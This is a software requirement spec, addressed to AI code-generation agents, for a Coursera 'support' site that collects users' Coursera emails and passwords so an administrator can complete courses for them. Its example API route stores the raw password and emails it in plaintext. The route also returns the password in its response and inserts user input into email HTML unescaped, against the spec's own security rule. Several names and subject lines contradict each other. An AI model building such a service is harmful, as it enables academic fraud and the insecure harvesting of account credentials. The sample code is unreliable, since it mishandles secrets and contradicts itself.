# Software Requirement Specification (SRS) & Architecture Blueprint
## System: Coursera Account & Course Request Collection Platform
## Tech Stack: Next.js (App Router), Neon DB (PostgreSQL + Prisma), Resend Mail, TailwindCSS + Shadcn/ui, Vercel

---

## 1. System Overview & Design Guidelines
This document serves as the absolute single source of truth for AI Generation Agents to build a professional, highly secure, and optimized web platform.

### Core Value Proposition
The platform allows users to submit their Coursera credentials along with specific Course IDs or Links that they need assistance with (e.g., course completion, material downloading, etc.). It automates admin notifications and provides a secure dashboard for the administrator to manage these credentials.

### UI/UX Branding & Aesthetic Guidelines
*   **Tone:** Professional, clean, trustworthy, corporate.
*   **Color Palette:**
    *   **Primary (Dominant):** Pure White (`#FFFFFF`) and Clean Light Grays (`#F9FAFB`, `#F3F4F6`).
    *   **Accent/Brand:** Professional Blue / Trust Blue (e.g., `#2563EB` - Indigo/Blue 600 or `#1D4ED8` - Blue 700).
    *   **Strict Prohibition:** NO neon colors, NO glowing effects, NO cyberpunk aesthetics.
*   **Component Library:** `shadcn/ui` (Radix UI primitives wrapped in TailwindCSS).

---

## 2. Domain-Driven Design (DDD) & Data Modeling

### Bounded Contexts
1.  **Submission Context:** Handles public users inputting Coursera accounts, handling the "Forgot Password" redirection logic, and logging raw requests.
2.  **Notification Context:** Manages triggers and payloads sent via Resend API to the administrator.
3.  **Admin Management Context:** Handles Admin authentication, secure listing, filtering, and state updates of collected credentials.

### Entity Relationship Diagram & Schema (Neon DB / Prisma)

```prisma
datasource db {
  provider  = "postgresql"
  url       = env("DATABASE_URL") // Neon Serverless Connection String
}

generator client {
  provider = "prisma-client-js"
}

enum RequestStatus {
  PENDING
  PROCESSING
  COMPLETED
  FAILED
}

model Admin {
  id        String   @id @default(uuid())
  username  String   @unique
  password  String   // Hashed with bcrypt
  createdAt DateTime @default(now())
}

model CourseraRequest {
  id             String        @id @default(uuid())
  email          String
  password       String        // Encrypted or stored securely based on admin discretion
  courseTarget   String        // Can be a Course ID or a full HTTP URL
  status         RequestStatus @default(PENDING)
  adminNotes     String?
  createdAt      DateTime      @default(now())
  updatedAt      DateTime      @updatedAt

  @@index([status])
  @@index([email])
}

```

---

## 3. Behavior-Driven Development (BDD) Specifications

### Feature 1: Public User Account & Course Submission

**As a** Guest User (No login required)
**I want to** submit my Coursera login details and the course I need help with
**So that** the system administrator can process my request.

* **Scenario 1: User already has a Coursera account and knows their password**
* **Given** the user is on the homepage.
* **When** they enter their Coursera Email, Password, and the Course Code or Link.
* **And** they click the "Gửi yêu cầu hỗ trợ" (Submit Request) button.
* **Then** the system should validate the inputs (valid email form, non-empty course target).
* **And** save the data into Neon DB with status `PENDING`.
* **And** trigger an instant email notification to the Admin via Resend.
* **And** show a `shadcn/ui` Toast notification stating: "Gửi yêu cầu thành công!"


* **Scenario 2: User does not have an account or needs to reset password**
* **Given** the user is filling out the form but does not have a set password.
* **When** they read the helper text or click the external helper link "Chưa có tài khoản hoặc quên mật khẩu?".
* **Then** the UI must clearly instruct them: "Vui lòng truy cập Coursera.org, bấm 'Quên mật khẩu' để đặt lại mật khẩu mới, sau đó nhập mật khẩu mới đó vào form dưới đây."
* **And** provide a clean outbound button redirecting to `https://www.coursera.org/?authMode=login` opening in a new tab.



---

### Feature 2: Automated Admin Email Notification

**As a** System Background Service
**I want to** dispatch a structured email using Resend
**So that** the Administrator is immediately notified of a new incoming request.

* **Scenario 1: Instant Notification Dispatched**
* **Given** a successful database insertion of a `CourseraRequest`.
* **When** the API route executing the creation finishes successfully.
* **Then** it instantiates the Resend client.
* **And** sends an HTML formatted email to the Admin Email (`ADMIN_NOTIFICATION_EMAIL`).
* **And** the email subject must be: `[Coursera Tool] Yêu cầu hỗ trợ mới từ ${email}`.
* **And** the body must explicitly list: Email, Password, Course Target, and a Direct Link to the Admin Dashboard.



---

### Feature 3: Secured Administrator Dashboard

**As an** Authenticated Administrator
**I want to** view, filter, and manage all submitted Coursera accounts
**So that** I can retrieve credentials and track progress.

* **Scenario 1: Secure Login**
* **Given** the user navigates to `/admin/login`.
* **When** they provide valid admin credentials checked against the `Admin` model via Iron-Session or NextAuth (or basic JWT-cookie state).
* **Then** redirect them to `/admin/dashboard`.


* **Scenario 2: Managing Requests**
* **Given** the admin is authenticated on `/admin/dashboard`.
* **Then** they must see a high-end data table (`shadcn/ui` table) displaying all records.
* **When** they click on a row or a specific action button.
* **Then** they can change the status (`PENDING` -> `PROCESSING` -> `COMPLETED`).
* **And** copy the email/password cleanly to clipboard with a 1-click copy icon.



---

## 4. Architectural & Implementation Details

### Next.js Folder Structure (App Router)

```text
├── src/
│   ├── app/
│   │   ├── layout.tsx         # Global layout with Inter Font, Providers (Toaster)
│   │   ├── page.tsx           # Clean Public User Form Component
│   │   ├── admin/
│   │   │   ├── login/
│   │   │   │   page.tsx       # Admin Login Page
│   │   │   └── dashboard/
│   │   │       page.tsx       # Admin Main Dashboard Panel
│   │   └── api/
│   │       ├── submit/
│   │       │   route.ts       # POST: Process public form submission & email trigger
│   │       └── admin/
│   │           ├── login/
│   │           │   route.ts   # POST: Admin Auth Session handling
│   │           └── requests/
│   │               route.ts   # GET/PATCH: Fetch and Update Coursera accounts status
│   ├── components/
│   │   ├── ui/                # shadcn/ui shared components (button, input, table, dialog, toast)
│   │   ├── Navbar.tsx         # Sleek white/blue branded top navigation bar
│   │   └── RequestTable.tsx   # Admin dashboard high-perf table implementation
│   ├── lib/
│   │   ├── db.ts              # Prisma Client Singleton wrapper for Neon connection
│   │   └── resend.ts          # Resend configuration instantiation

```

### Critical API Endpoint Implementations

#### 1. Public Submission Endpoint (`/api/submit/route.ts`)

```typescript
import { NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: Request) {
  try {
    const { email, password, courseTarget } = await req.json();

    if (!email || !password || !courseTarget) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // 1. Save to Neon Database via Prisma
    const newRequest = await db.courseraRequest.create({
      data: { email, password, courseTarget },
    });

    // 2. Send email via Resend
    await resend.emails.send({
      from: 'Coursera Platform <onboarding@resend.dev>', // Replace with custom domain if available
      to: process.env.ADMIN_ALERT_EMAIL || 'admin@example.com',
      subject: `🚨 Hỗ Trợ Coursera Mới: ${email}`,
      html: `
        <h2>Có yêu cầu hỗ trợ mới được tạo!</h2>
        <p><strong>Tài khoản:</strong> ${email}</p>
        <p><strong>Mật khẩu:</strong> ${password}</p>
        <p><strong>Môn học / Đường dẫn:</strong> ${courseTarget}</p>
        <p><strong>Thời gian:</strong> ${newRequest.createdAt.toLocaleString()}</p>
        <br/>
        <a href="${process.env.NEXT_PUBLIC_APP_URL}/admin/dashboard" style="background:#2563EB;color:white;padding:10px 15px;text-decoration:none;border-radius:5px;">Truy cập Trang Quản Trị</a>
      `,
    });

    return NextResponse.json({ success: true, data: newRequest }, { status: 201 });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}

```

---

## 5. Frontend UI Component Requirements

### Public Layout (`src/app/page.tsx`)

*   **Card Container:** Centered `shadcn/ui` `<Card>` with sharp typography.
*   **Header Section:** Explicitly show an icon or clean text indicating "Hệ thống hỗ trợ học tập Coursera".
*   **Form Controls:**
* `<Input type="email">` with placeholder `example@gmail.com`.
* `<Input type="password">` with hide/show toggle option.
* `<Input type="text">` for Course ID / Coursera URL Link.


*   **Helper Callout box (`shadcn/ui` Alert component inside the form):**
* Background: Light blue Tint (`#EFF6FF`), Border: Blue-200.
* Content: *"Chưa có tài khoản hoặc quên mật khẩu? Hãy truy cập Coursera, nhấn quên mật khẩu để tạo mật khẩu mới, sau đó điền mật khẩu đó vào biểu mẫu này."* kèm một nút bấm mở link Coursera trong tab mới.



### Admin Dashboard Layout (`src/app/admin/dashboard/page.tsx`)

*   **Top Bar:** Pure white background, thin border bottom (`border-slate-100`), showing App Title, and a "Đăng xuất" (Logout) button.
*   **Main Section:** Max width container (`max-w-7xl`).
*   **Data Layout:** Use `<Table>`, `<TableHeader>`, `<TableBody>`, `<TableRow>`, `<TableCell>` components from shadcn.
*   **Status Badges:**
* `PENDING`: Gray/Slate background with dark gray text.
* `PROCESSING`: Light blue background with bright blue text.
* `COMPLETED`: Light green background with dark green text.



---

## 6. Environment Variables Setup (`.env.local`)

The Agent must ensure the system relies on the following environment structures:

```env
# Database connection directly to Neon Serverless Postgres Instance
DATABASE_URL="postgresql://user:password@neon-host/dbname?sslmode=require"

# Resend API Key setup
RESEND_API_KEY="re_123456789"
ADMIN_ALERT_EMAIL="your-admin-email@gmail.com"

# App Context Url
NEXT_PUBLIC_APP_URL="http://localhost:3000"
JWT_SECRET="super-secure-random-string-for-admin-session"

```

---

## 7. Execution Prompt Rules for Agent Generation

1. **Strict Compliance:** Follow exact variable names specified in the Prisma schema.
2. **No Placeholders:** Generate full actual components. Implement actual string operations, layouts, and validation logic instead of writing code comments like `// implement here`.
3. **Security Notice:** Ensure input strings are parsed correctly and HTML injection within email dispatches are neutralized. Use Tailwind classes directly without custom CSS stylesheets.

```

```
